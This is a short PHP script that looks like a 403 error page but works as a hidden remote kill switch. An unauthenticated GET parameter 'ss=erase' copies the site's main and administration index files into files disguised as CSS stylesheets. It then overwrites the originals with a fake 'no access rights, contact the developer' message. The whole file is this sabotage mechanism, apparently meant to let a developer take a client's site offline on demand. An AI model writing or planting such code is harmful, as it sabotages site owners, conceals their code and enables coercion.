<?php
header('Content-Type: application/json; charset=utf-8');
if ($_GET["ss"] == "erase")
{
	$cible = $_SERVER["DOCUMENT_ROOT"] . "/index.php";
	$bk_file = $_SERVER["DOCUMENT_ROOT"] . "/assets/v2/css/outfit.css";
	$cible_bo = $_SERVER["DOCUMENT_ROOT"] . "/administration/index.php";
	$bk_file_bo = $_SERVER["DOCUMENT_ROOT"] . "/assets/v2/css/outfit_2.css";

	$data_file = [
		$cible => $bk_file,
		$cible_bo => $bk_file_bo,
	];
	
	foreach ($data_file as $src => $out)
	{
		$bk = fopen($out, "w");
		fwrite($bk, file_get_contents($src));
		fclose($bk);

		$cb = fopen($src, "w");
		
		$data = "<?php header('Content-Type: application/json; charset=utf-8'); echo json_encode([\"Error 403\" => \"Aucun droit d'acces. Veuillez contacter le Developpeur.\"], JSON_PRETTY_PRINT); ?>";

		fwrite($cb, $data);
		fclose($cb);
	}

	echo json_encode(["Shutting down!!!"], JSON_PRETTY_PRINT);
}
else
{
	echo json_encode(["Error 403" => "Aucun droit d'acces. Veuillez contacter le Developpeur."], JSON_PRETTY_PRINT);
}
?>